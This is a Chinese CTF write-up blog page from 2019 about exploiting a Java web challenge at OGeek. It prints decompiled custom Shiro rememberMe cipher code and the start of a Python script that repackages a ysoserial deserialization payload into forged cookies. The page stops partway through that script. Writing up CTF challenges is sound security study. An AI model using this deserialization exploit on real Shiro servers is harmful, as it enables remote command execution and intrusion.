@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/favicon.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"rmb122.com","root":"/","scheme":"Mist","version":"8.0.0-rc.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="因为最近课程非常非常多, 还顺带考试 + 实验报告, 咕咕咕掉了许多比赛, 真正去的也只有 OGeek, 其他都是云比赛.拿做出来的题目里面选两题写个 Writeup 吧, 不然太久没更新了 (逃">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OGeek 线下 Java Web And XCTF Final babytaint Writeup">
+<meta property="og:url" content="https://rmb122.com/2019/10/31/OGeek-%E7%BA%BF%E4%B8%8B-Java-Web-And-XCTF-Final-babytaint-Writeup/index.html">
+<meta property="og:site_name" content="Rmb122&#39;s Notebook">
+<meta property="og:description" content="因为最近课程非常非常多, 还顺带考试 + 实验报告, 咕咕咕掉了许多比赛, 真正去的也只有 OGeek, 其他都是云比赛.拿做出来的题目里面选两题写个 Writeup 吧, 不然太久没更新了 (逃">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-10-31T14:37:15.000Z">
+<meta property="article:modified_time" content="2019-10-31T15:08:11.950Z">
+<meta property="article:author" content="rmb122">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://rmb122.com/2019/10/31/OGeek-%E7%BA%BF%E4%B8%8B-Java-Web-And-XCTF-Final-babytaint-Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>OGeek 线下 Java Web And XCTF Final babytaint Writeup | Rmb122's Notebook</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Rmb122's Notebook" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line toggle-line-first"></span>
+        <span class="toggle-line toggle-line-middle"></span>
+        <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Rmb122's Notebook</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://rmb122.com/2019/10/31/OGeek-%E7%BA%BF%E4%B8%8B-Java-Web-And-XCTF-Final-babytaint-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="rmb122">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Rmb122's Notebook">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          OGeek 线下 Java Web And XCTF Final babytaint Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-10-31 22:37:15" itemprop="dateCreated datePublished" datetime="2019-10-31T22:37:15+08:00">2019-10-31</time>
+            </span>
+
+          
+            <span id="/2019/10/31/OGeek-%E7%BA%BF%E4%B8%8B-Java-Web-And-XCTF-Final-babytaint-Writeup/" class="post-meta-item leancloud_visitors" data-flag-title="OGeek 线下 Java Web And XCTF Final babytaint Writeup" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2019/10/31/OGeek-%E7%BA%BF%E4%B8%8B-Java-Web-And-XCTF-Final-babytaint-Writeup/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/10/31/OGeek-%E7%BA%BF%E4%B8%8B-Java-Web-And-XCTF-Final-babytaint-Writeup/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>因为最近课程非常非常多, 还顺带考试 + 实验报告, 咕咕咕掉了许多比赛, 真正去的也只有 OGeek, 其他都是云比赛.<br>拿做出来的题目里面选两题写个 Writeup 吧, 不然太久没更新了 (逃</p>
+<a id="more"></a>
+
+<h2 id="Java-Web"><a href="#Java-Web" class="headerlink" title="Java Web"></a>Java Web</h2><p>这题运气比较好, 拿了一血<br>拿到题目可以看到一堆 jsp, 可以确定是 java web.  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ tree -L 2 . --dirsfirst</span><br><span class="line">.</span><br><span class="line">├── css</span><br><span class="line">│   ├── main.css</span><br><span class="line">│   └── util.css</span><br><span class="line">├── fonts</span><br><span class="line">│   ├── font-awesome-4.7.0</span><br><span class="line">│   ├── iconic</span><br><span class="line">│   └── poppins</span><br><span class="line">├── images</span><br><span class="line">│   ├── icons</span><br><span class="line">│   └── bg-01.jpg</span><br><span class="line">├── js</span><br><span class="line">│   └── main.js</span><br><span class="line">├── META-INF</span><br><span class="line">│   └── MANIFEST.MF</span><br><span class="line">├── vendor</span><br><span class="line">│   ├── animate</span><br><span class="line">│   ├── animsition</span><br><span class="line">│   ├── bootstrap</span><br><span class="line">│   ├── countdowntime</span><br><span class="line">│   ├── css-hamburgers</span><br><span class="line">│   ├── daterangepicker</span><br><span class="line">│   ├── jquery</span><br><span class="line">│   ├── perfect-scrollbar</span><br><span class="line">│   └── select2</span><br><span class="line">├── WEB-INF</span><br><span class="line">│   ├── classes</span><br><span class="line">│   ├── lib</span><br><span class="line">│   └── web.xml</span><br><span class="line">├── error.jsp</span><br><span class="line">├── index.jsp</span><br><span class="line">├── login.jsp</span><br><span class="line">└── success.jsp</span><br></pre></td></tr></table></figure>
+
+<p>逻辑比较简单, 漏洞也不在这些 jsp 里面</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">"shiro"</span> uri=<span class="string">"http://shiro.apache.org/tags"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Login V3&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"icon"</span> type=<span class="string">"image/png"</span> href=<span class="string">"images/icons/favicon.ico"</span>/&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"vendor/bootstrap/css/bootstrap.min.css"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"fonts/font-awesome-4.7.0/css/font-awesome.min.css"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"fonts/iconic/css/material-design-iconic-font.min.css"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">&lt;!-- 省略掉一些 html --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">&lt;form action=<span class="string">"/register"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span> value=<span class="string">""</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"password"</span> value=<span class="string">""</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;&lt;br&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 shiro, 注意 <code>WEB-INF/lib/</code> 里面的 <code>shiro-core-1.2.4.jar</code> 是存在漏洞的版本, 可以利用 java 反序列化执行命令.<br>遂直接用了之前的找的 exp, 但是 JRMPClient 并没有回连的反应, 再看看 web.xml</p>
+<p>web.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span></span><br><span class="line">    classpath:spring-shiro.xml</span><br><span class="line">  <span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.DelegatingFilterProxy<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">async-supported</span>&gt;</span>true<span class="tag">&lt;/<span class="name">async-supported</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>targetFilterLifecycle<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>找到 WEB-INF/classes/spring-shiro.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 省略掉一些没用的配置 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- rememberMe管理器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"rememberMeManager"</span> <span class="attr">class</span>=<span class="string">"com.collection.shiro.manager.ShiroRememberManager"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"cookie"</span> <span class="attr">ref</span>=<span class="string">"rememberMeCookie"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 省略掉一些没用的配置 --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到出题人用了自己实现的 rememberMeManager, 我们掏出 jd-gui 看看.</p>
+<p>WEB-INF/classes/com/collection/shiro/manager/ShiroRememberManager.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] getKeyFromConfig() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InputStream fileInputStream = getClass().getResourceAsStream(<span class="string">"remember.key"</span>);</span><br><span class="line">        String key = <span class="string">""</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (fileInputStream == <span class="keyword">null</span> || fileInputStream.available() &lt; <span class="number">32</span>) &#123;</span><br><span class="line">        BufferedWriter writer = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(getClass().getResource(<span class="string">"/"</span>).getPath() + <span class="string">"com/collection/shiro/manager/remember.key"</span>));</span><br><span class="line">        key = RandomStringUtils.random(<span class="number">32</span>, <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()_="</span>);</span><br><span class="line">        writer.write(key);</span><br><span class="line">        writer.close();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[fileInputStream.available()];</span><br><span class="line">        fileInputStream.read(bytes);</span><br><span class="line">        key = <span class="keyword">new</span> String(bytes);</span><br><span class="line">        fileInputStream.close();</span><br><span class="line">        &#125; </span><br><span class="line">        key = (<span class="keyword">new</span> Md5Hash(key)).toString();</span><br><span class="line">        <span class="keyword">return</span> key.getBytes();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>WEB-INF/classes/com/collection/shiro/crypto/ShiroCipherService.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroCipherService</span> <span class="keyword">implements</span> <span class="title">CipherService</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> ByteSource <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] ciphertext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    String skey = (<span class="keyword">new</span> Sha1Hash(<span class="keyword">new</span> String(key))).toString();</span><br><span class="line">    <span class="keyword">byte</span>[] bkey = skey.getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] data_bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[ciphertext.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ciphertext.length; i++) &#123;</span><br><span class="line">      data_bytes[i] = (<span class="keyword">byte</span>)(ciphertext[i] ^ bkey[i % bkey.length]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">byte</span>[] jsonData = <span class="keyword">new</span> <span class="keyword">byte</span>[ciphertext.length / <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; jsonData.length; i++) &#123;</span><br><span class="line">      jsonData[i] = (<span class="keyword">byte</span>)(data_bytes[i * <span class="number">2</span>] ^ data_bytes[i * <span class="number">2</span> + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    JSONObject jsonObject = <span class="keyword">new</span> JSONObject(<span class="keyword">new</span> String(jsonData));</span><br><span class="line">    String serial = (String)jsonObject.get(<span class="string">"serialize_data"</span>);</span><br><span class="line">    <span class="keyword">return</span> ByteSource.Util.bytes(Base64.getDecoder().decode(serial));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> ByteSource <span class="title">encrypt</span><span class="params">(<span class="keyword">byte</span>[] plaintext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    String sign = (<span class="keyword">new</span> Md5Hash(UUID.randomUUID().toString())).toString() + <span class="string">"asfda-92u134-"</span>;</span><br><span class="line">    Subject subject = SecurityUtils.getSubject();</span><br><span class="line">    HttpServletRequest servletRequest = WebUtils.getHttpRequest(subject);</span><br><span class="line">    String user_agent = servletRequest.getHeader(<span class="string">"User-Agent"</span>);</span><br><span class="line">    String ip_address = servletRequest.getHeader(<span class="string">"X-Forwarded-For"</span>);</span><br><span class="line">    ip_address = (ip_address == <span class="keyword">null</span>) ? servletRequest.getRemoteAddr() : ip_address;</span><br><span class="line">    String data = <span class="string">"&#123;\"user_is_login\":\"1\",\"sign\":\""</span> + sign + <span class="string">"\",\"ip_address\":\""</span> + ip_address + <span class="string">"\",\"user_agent\":\""</span> + user_agent + <span class="string">"\",\"serialize_data\":\""</span> + Base64.getEncoder().encodeToString(plaintext) + <span class="string">"\"&#125;"</span>;</span><br><span class="line">    <span class="keyword">byte</span>[] data_bytes = data.getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] okey = (<span class="keyword">new</span> Sha1Hash(<span class="keyword">new</span> String(key))).toString().getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] mkey = (<span class="keyword">new</span> Sha1Hash(UUID.randomUUID().toString())).toString().getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] out = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2</span> * data_bytes.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data_bytes.length; i++) &#123;</span><br><span class="line">      out[i * <span class="number">2</span>] = mkey[i % mkey.length];</span><br><span class="line">      out[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="keyword">byte</span>)(mkey[i % mkey.length] ^ data_bytes[i]);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[out.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; out.length; i++) &#123;</span><br><span class="line">      result[i] = (<span class="keyword">byte</span>)(out[i] ^ okey[i % okey.length]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ByteSource.Util.bytes(result);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这相当于魔改了原版的 shiro, 原版的是直接用的 AES. 我们可以看到这里魔改后秘钥是读的 <code>com/collection/shiro/manager/remember.key</code>. (docker 初始自带一个 key, 所有人都用的一个, 不会自己生成).<br>然后算法也从 AES 变成了出题人手写的加密算法. 然后将序列化后的对象 base64 之后放在了 json 的 <code>serialize_data</code> 里面<br>我们可以写个脚本二次重写一下 ysoserial 生成的 payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> dumps</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/home/rmb122/repos/ysoserial/target/1.bin'</span></span><br><span class="line">payload = open(payload, <span class="string">'rb'</span>).read()</span><br><span class="line">payload = b64encode(payload).decode()</span><br><span class="line">data = &#123;<span class="string">"user_is_login"</span>: <span class="string">"1"</span>, <span class="string">"sign"</span>: <span class="string">"9368b2d39093ed7164841e4050f9cdbeasfda-92u134-"</span>, <span class="string">"ip_address"</span>: <span class="string">"10.10.19.245"</span>, <span class="string">"user_agent"</span>: <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"</span>,</span><br><span class="line"><span class="string">"serialize_data"</span>: payload&#125;</span><br><span class="line">data = dumps(data).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span 